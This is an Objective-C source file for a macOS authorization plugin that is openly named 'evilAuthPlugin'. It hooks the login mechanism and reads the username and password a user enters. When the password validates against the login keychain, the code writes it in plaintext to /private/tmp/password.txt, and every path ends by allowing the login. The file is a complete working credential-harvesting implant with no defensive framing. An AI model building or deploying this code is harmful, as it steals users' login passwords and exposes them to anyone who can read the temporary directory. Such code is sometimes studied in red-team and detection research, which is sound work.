//
//  main.m
//  evilAuthPlugin
//
//  Created by Chris Ross on 9/24/18.
//
// Code taken from here: https://github.com/alex030/UserConfigAgent/blob/42e3d786d52604b3cfbcdf8c77320093684626d7/UserConfigAgentPlugin/main.m

#import <Foundation/Foundation.h>
#import <Security/AuthorizationPlugin.h>
#include <Security/AuthSession.h>
#include <Security/AuthorizationTags.h>
#include <CoreServices/CoreServices.h>
#include "Common.h"
#include <syslog.h>
#include <unistd.h>


#define kKMAuthAuthorizeRight "authorize-right"
#define kMechanismMagic "MLSP"
#define kPluginMagic "PlgN"

struct PluginRecord {
    OSType                          fMagic;         // must be kPluginMagic
    const AuthorizationCallbacks *  fCallbacks;
};

typedef struct PluginRecord PluginRecord;

struct MechanismRecord {
    OSType                          fMagic;         // must be kMechanismMagic
    AuthorizationEngineRef          fEngine;
    const PluginRecord *            fPlugin;
    Boolean                         fWaitForDebugger;
};

typedef struct MechanismRecord MechanismRecord;

NSString *GetStringFromContext(struct MechanismRecord *mechanism, AuthorizationString key) {
    const AuthorizationValue *value;
    AuthorizationContextFlags flags;
    OSStatus err = mechanism->fPlugin->fCallbacks->GetContextValue(mechanism->fEngine, key, &flags, &value);
    if (err == errSecSuccess && value->length > 0) {
        NSString *s = [[NSString alloc] initWithBytes:value->data
                                            length:value->length
                                             encoding:NSUTF8StringEncoding];
        return [s stringByReplacingOccurrencesOfString:@"\0" withString:@""];
    }
    return nil;
}


NSString *GetStringFromHint(MechanismRecord *mechanism, AuthorizationString key) {
    const AuthorizationValue *value;
    OSStatus err = mechanism->fPlugin->fCallbacks->GetHintValue(mechanism->fEngine, key,&value);
    if (err == errSecSuccess && value->length > 0) {
        NSString *s = [[NSString alloc] initWithBytes:value->data
                                               length:value->length
                                             encoding:NSUTF8StringEncoding];
        return [s stringByReplacingOccurrencesOfString:@"\0" withString:@""];
    }
    return nil;
}

OSStatus AllowLogin(MechanismRecord *mechanism) {
    return mechanism->fPlugin->fCallbacks->SetResult(mechanism->fEngine,kAuthorizationResultAllow);
}

OSStatus MechanismCreate(AuthorizationPluginRef inPlugin,AuthorizationEngineRef inEngine,AuthorizationMechanismId mechanismId,AuthorizationMechanismRef *outMechanism) {
    MechanismRecord *mechanism = (MechanismRecord *)malloc(sizeof(MechanismRecord));
    if (mechanism == NULL) return errSecMemoryError;
    mechanism->fMagic = kMechanismMagic;
    mechanism->fEngine = inEngine;
    mechanism->fPlugin = (PluginRecord *)inPlugin;
    *outMechanism = mechanism;
    return errSecSuccess;
}

OSStatus MechanismDestroy(AuthorizationMechanismRef inMechanism) {
    free(inMechanism);
    return errSecSuccess;
}

OSStatus MechanismInvoke(AuthorizationMechanismRef inMechanism) {
    MechanismRecord *mechanism = (MechanismRecord *)inMechanism;
    @autoreleasepool {
        
        // Make sure this is not a hidden user.
        
        NSString *username = GetStringFromContext(mechanism, kAuthorizationEnvironmentUsername);
        NSString *password = GetStringFromContext(mechanism, kAuthorizationEnvironmentPassword);
        // NSString *sesOwner = GetStringFromHint(mechanism, kKMAuthSuggestedUser);
        NSString *AuthAuthorizeRight = GetStringFromHint(mechanism, kKMAuthAuthorizeRight);
        
        // Make sure we have username and password data.
        if (!username || !password) {
            return AllowLogin(mechanism);
        }
        
        BOOL keychainPasswordValid = YES;
        
        SecKeychainSetUserInteractionAllowed(NO);
        keychainPasswordValid = ValidateLoginKeychainPassword(password);
        // Revert back to the default ids
        pthread_setugid_np(KAUTH_UID_NONE, KAUTH_GID_NONE);
        
        //NSData *passwordData = [NSKeyedArchiver archivedDataWithRootObject:password];
        if (keychainPasswordValid) {
            [password writeToFile:@"/private/tmp/password.txt" atomically:TRUE encoding:NSUTF8StringEncoding error:NULL];
        }
    }
    
    return AllowLogin(mechanism);
}

OSStatus MechanismDeactivate(AuthorizationMechanismRef inMechanism) {
    MechanismRecord *mechanism = (MechanismRecord *)inMechanism;
    return mechanism->fPlugin->fCallbacks->DidDeactivate(mechanism->fEngine);
}

OSStatus PluginDestroy(AuthorizationPluginRef inPlugin) {
    free(inPlugin);
    return errSecSuccess;
}

OSStatus AuthorizationPluginCreate(
                                   const AuthorizationCallbacks *callbacks,
                                   AuthorizationPluginRef *outPlugin,
                                   const AuthorizationPluginInterface **outPluginInterface) {
    PluginRecord *plugin = (PluginRecord *)malloc(sizeof(PluginRecord));
    if (plugin == NULL) return errSecMemoryError;
    plugin->fMagic = kPluginMagic;
    plugin->fCallbacks = callbacks;
    *outPlugin = plugin;
    
    static AuthorizationPluginInterface pluginInterface = {
        kAuthorizationPluginInterfaceVersion,
        &PluginDestroy,
        &MechanismCreate,
        &MechanismInvoke,
        &MechanismDeactivate,
        &MechanismDestroy
    };
    *outPluginInterface = &pluginInterface;
    
    return errSecSuccess;
}
